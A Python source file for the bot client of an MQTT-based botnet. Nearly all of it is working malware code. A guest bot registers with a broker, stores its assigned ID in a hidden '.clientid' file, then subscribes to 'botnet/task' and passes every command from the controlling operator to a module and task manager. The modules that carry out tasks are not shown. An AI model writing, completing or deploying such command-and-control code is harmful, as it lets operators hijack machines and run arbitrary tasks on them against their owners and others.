import paho.mqtt.client as mqtt
import time
import uuid
from threading import Thread

from botnet import logger
from botnet.module_manager import ModuleManager
from botnet.bot.task import TaskManager

# Bot class (abstract)
class Bot():
    # Setup client id and methods
    def __init__(self, client_id, address, port=1883):
        self.address = address
        self.port = port
        self.client_id = client_id

        self.client = mqtt.Client(self.client_id)
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message

    # Connect to target ip @ and port
    def connect(self):
        logger.debug("Connected to {}:{} ({})".format(self.address, self.port, self.client_id))
        self.client.connect(self.address, self.port, 60)

    # Loop forever to wait for incoming message
    def listen(self):
        self.client.loop_forever()

    # Subscribe to topic
    def subscribe(self, topic):
        logger.debug("Subscribed to {}".format(topic))
        self.client.subscribe(topic)

    # Publish message to topic
    def publish(self, topic, message):
        logger.debug("Published to {}: {}".format(topic, message))
        self.client.publish(topic, message)

    # On connect
    def on_connect(self, client, userdata, flags, rc):
        pass

    # On message received
    def on_message(self, client, userdata, message):
        pass

# GuestBot class
class GuestBot(Bot):
    # Call parent constructor with a guest ID
    def __init__(self, address, port=1883):
        super().__init__("guest" + str(uuid.uuid1())[:8], address, port)

    # On connect
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            self.subscribe("botnet/client/register")
            self.publish("botnet/client/guest", "0")
    
    # On message received
    def on_message(self, client, userdata, message):
        if message.topic == "botnet/client/register":
            msg = message.payload.decode("UTF-8")
            
            msg = msg.split(":")
            if msg[0] == self.client_id:
                self.toRegisteredBot(msg[1])

        pass

    # Check if client already have an ID
    def getID(self):
        logger.debug("Récupération de l'ID du client")
        try:
            with open('.clientid') as f:
                content = f.read()

                if content == '':
                    raise FileNotFoundError("File .client.id not found")
                else:
                    logger.debug("ID : " + content)
                    return content
        except FileNotFoundError:
            return None

    # Create RegisteredBot object from this GuestBot
    def toRegisteredBot(self, client_id):
        bot = RegisteredBot(client_id, self.address, self.port)

        if self.client.is_connected():
            self.client.disconnect()

            with open(".clientid", "w") as f:
                f.write(client_id)

        bot.connect()
        bot.subscribe("botnet/task")
        bot.listen()

# RegisteredBot class
class RegisteredBot(Bot):
    # Create ModuleManager and TaskManager before calling parent constructor with specific client ID
    def __init__(self, client_id, address, port=1883):
        self.module_manager = ModuleManager()
        self.module_manager.load()

        self.task_manager = TaskManager(self.module_manager)

        super().__init__(client_id, address, port)

    # On message received
    def on_message(self, client, userdata, message):
        logger.debug("Message received {}: {}".format(message.topic, message.payload.decode("UTF-8")))
        self.task_manager.queue(message.topic, message.payload.decode("UTF-8"))

